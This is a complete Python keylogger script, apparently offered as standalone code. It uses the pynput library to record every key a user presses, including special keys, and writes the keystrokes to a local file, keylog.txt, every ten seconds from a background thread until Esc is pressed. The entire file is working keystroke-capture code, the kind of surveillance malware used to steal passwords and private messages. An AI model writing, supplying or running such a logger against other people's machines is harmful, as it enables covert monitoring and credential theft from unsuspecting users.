from pynput import keyboard
import threading
import time

log = ""

def on_press(key):
    global log
    try:
        log += key.char  # Log the character of the key
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        else:
            log += f" [{key}] "

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

def write_log():
    global log
    while True:
        with open("keylog.txt", "a") as f:
            f.write(log)
            log = ""  
        time.sleep(10)  # Write to the file every 10 seconds

# Start a thread to write the log periodically
thread = threading.Thread(target=write_log)
thread.daemon = True  # Ensure the thread exits when the main program does
thread.start()

# Start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
